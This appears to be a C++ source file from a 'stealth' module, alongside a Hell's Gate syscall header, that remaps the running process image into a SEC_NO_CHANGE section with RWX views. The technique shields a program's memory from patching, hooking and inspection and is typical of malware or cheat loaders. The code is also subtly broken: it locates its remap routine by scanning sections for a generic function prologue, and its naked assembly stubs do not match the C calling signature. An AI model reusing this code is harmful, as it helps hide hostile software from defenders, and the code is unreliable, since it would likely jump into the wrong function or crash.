#include <diarna/compiler_port.hpp>
#include <diarna/stealth/remap.hpp>
#include <diarna/stealth/hells_gate.hpp>
#include <cstring>

typedef NTSTATUS(NTAPI* NtCreateSection_fn)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
typedef NTSTATUS(NTAPI* NtMapViewOfSection_fn)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG);
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_fn)(HANDLE,PVOID);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_fn)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);

#ifndef ViewUnmap
#define ViewUnmap 0x00000002
#endif
#ifndef SEC_NO_CHANGE
#define SEC_NO_CHANGE 0x00400000
#endif
#ifndef SEC_COMMIT
#define SEC_COMMIT 0x08000000
#endif

namespace diarna::stealth {

ImageRemapper& ImageRemapper::instance() { static ImageRemapper r; return r; }

ImageRemapper::ImageRemapper()
    : remap_region_(nullptr), section_handle_(nullptr),
      remapped_image_base_(nullptr), remapped_(false) {
    memset(&info_, 0, sizeof(info_));

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    granularity_ = si.dwAllocationGranularity;
}

ImageRemapper::~ImageRemapper() {
    if (remapped_ && remapped_image_base_) {
        NtUnmapViewOfSection_fn fn = reinterpret_cast<NtUnmapViewOfSection_fn>(
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection"));
        if (fn) fn(GetCurrentProcess(), remapped_image_base_);
    }
    if (remap_region_) VirtualFree(remap_region_, 0, MEM_RELEASE);
}

bool ImageRemapper::initialize() {
    HMODULE base = GetModuleHandleW(nullptr);
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(reinterpret_cast<uint8_t*>(base) + dos->e_lfanew);

    size_t image_size = nt->OptionalHeader.SizeOfImage;
    info_.original_base = base;
    info_.image_size = image_size;

    remap_region_ = VirtualAlloc(nullptr, image_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remap_region_) return false;

    memcpy(remap_region_, base, image_size);

    uintptr_t routine_offset = find_remap_routine(remap_region_, image_size);
    if (!routine_offset) { VirtualFree(remap_region_, 0, MEM_RELEASE); remap_region_ = nullptr; return false; }

    uintptr_t routine_addr = reinterpret_cast<uintptr_t>(remap_region_) + routine_offset;
    auto remap_fn = reinterpret_cast<void(*)(void*, void*, void*, uint32_t)>(routine_addr);

    remap_fn(remap_region_, &section_handle_, &remapped_image_base_, granularity_);

    if (!section_handle_ || !remapped_image_base_) {
        VirtualFree(remap_region_, 0, MEM_RELEASE);
        remap_region_ = nullptr;
        return false;
    }

    remapped_ = true;
    info_.remapped_base = remapped_image_base_;
    info_.active = true;
    info_.remap_ticks = __rdtsc();
    return true;
}

bool ImageRemapper::remap_image() { return initialize(); }
bool ImageRemapper::is_remapped() const { return remapped_; }
void* ImageRemapper::remap_region() const { return remap_region_; }
void* ImageRemapper::section_handle() const { return section_handle_; }
ImageRemapper::RemapInfo ImageRemapper::info() const { return info_; }

uintptr_t ImageRemapper::find_remap_routine(void* remap_base, size_t image_size) {
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(remap_base);
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(reinterpret_cast<uint8_t*>(remap_base) + dos->e_lfanew);

    auto* sections = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (strncmp(reinterpret_cast<const char*>(sections[i].Name), ".remap", 6) == 0 ||
            strncmp(reinterpret_cast<const char*>(sections[i].Name), ".rdata", 6) == 0) {
            uint8_t* section_data = reinterpret_cast<uint8_t*>(remap_base) + sections[i].VirtualAddress;

            static const uint8_t signature[] = {
                0x48, 0x89, 0x5C, 0x24, 0x08,
                0x48, 0x89, 0x74, 0x24, 0x10,
                0x48, 0x89, 0x7C, 0x24, 0x18,
                0x55, 0x41, 0x54, 0x41, 0x55
            };

            for (uint32_t j = 0; j < sections[i].SizeOfRawData - sizeof(signature); ++j) {
                if (memcmp(section_data + j, signature, sizeof(signature)) == 0) {
                    return sections[i].VirtualAddress + j;
                }
            }
        }
    }

    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        uint8_t* section_data = reinterpret_cast<uint8_t*>(remap_base) + sections[i].VirtualAddress;
        static const uint8_t pat[] = {
            0x48, 0x89, 0x5C, 0x24, 0x08,
            0x48, 0x89, 0x74, 0x24, 0x10
        };
        for (uint32_t j = 0; j < sections[i].SizeOfRawData - sizeof(pat); ++j) {
            if (memcmp(section_data + j, pat, sizeof(pat)) == 0) {
                return sections[i].VirtualAddress + j;
            }
        }
    }

    return 0;
}

static void remap_routine_impl(void* image_base, void** out_section, void** out_base, uint32_t gran) {
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(image_base);
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(reinterpret_cast<uint8_t*>(image_base) + dos->e_lfanew);

    size_t image_size = nt->OptionalHeader.SizeOfImage;

    LARGE_INTEGER max_size;
    max_size.QuadPart = static_cast<LONGLONG>(image_size);

    HANDLE section = nullptr;
    NtCreateSection_fn NtCreateSec = reinterpret_cast<NtCreateSection_fn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateSection"));

    OBJECT_ATTRIBUTES oa;
    memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);

    NtCreateSec(&section, SECTION_ALL_ACCESS, &oa, &max_size,
                PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);

    void* full_view = nullptr;
    SIZE_T view_size = image_size;
    LARGE_INTEGER section_offset;
    section_offset.QuadPart = 0;

    NtMapViewOfSection_fn NtMap = reinterpret_cast<NtMapViewOfSection_fn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtMapViewOfSection"));

    NtMap(section, GetCurrentProcess(), &full_view, 0, image_size,
          &section_offset, &view_size, ViewUnmap, 0, PAGE_READWRITE);

    memcpy(full_view, image_base, image_size);

    NtUnmapViewOfSection_fn NtUnmap = reinterpret_cast<NtUnmapViewOfSection_fn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection"));
    NtUnmap(GetCurrentProcess(), full_view);

    auto* sections = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (sections[i].SizeOfRawData == 0) continue;

        uint32_t aligned_rva = sections[i].VirtualAddress & ~(gran - 1);
        uint32_t aligned_end = (sections[i].VirtualAddress + sections[i].Misc.VirtualSize + gran - 1) & ~(gran - 1);
        uint32_t aligned_size = aligned_end - aligned_rva;

        SIZE_T vs = aligned_size;
        void* view = nullptr;
        LARGE_INTEGER off;
        off.QuadPart = aligned_rva;

        NtMap(section, GetCurrentProcess(), &view, 0, vs,
              &off, &vs, ViewUnmap, SEC_NO_CHANGE, PAGE_EXECUTE_READWRITE);
    }

    void* remapped_entry = nullptr;
    SIZE_T entry_size = image_size;
    LARGE_INTEGER entry_off;
    entry_off.QuadPart = nt->OptionalHeader.ImageBase & (gran - 1);

    NtMap(section, GetCurrentProcess(), &remapped_entry, 0, entry_size,
          &entry_off, &entry_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);

    *out_section = section;
    *out_base = remapped_entry;
}

#if defined(DIARNA_ARCH_X64)
__attribute__((naked, section(".remap")))
void remap_stub_entry() {
    asm volatile(
        ".intel_syntax noprefix\n\t"
        "push   rbp\n\t"
        "mov    rbp, rsp\n\t"
        "sub    rsp, 0x40\n\t"
        "mov    [rbp-0x08], rcx\n\t"
        "mov    [rbp-0x10], rdx\n\t"
        "mov    [rbp-0x18], r8\n\t"
        "mov    [rbp-0x20], r9\n\t"
        "call   remap_routine_impl\n\t"
        "mov    rax, [rbp-0x18]\n\t"
        "mov    rax, [rax]\n\t"
        "add    rsp, 0x40\n\t"
        "pop    rbp\n\t"
        "ret\n\t"
        ".att_syntax prefix\n\t"
        ::: "memory"
    );
}
#else
__attribute__((naked, section(".remap")))
void remap_stub_entry() {
    asm volatile(
        ".intel_syntax noprefix\n\t"
        "push   ebp\n\t"
        "mov    ebp, esp\n\t"
        "sub    esp, 0x20\n\t"
        "call   remap_routine_impl\n\t"
        "add    esp, 0x20\n\t"
        "pop    ebp\n\t"
        "ret\n\t"
        ".att_syntax prefix\n\t"
        ::: "memory"
    );
}
#endif

} // namespace diarna::stealth
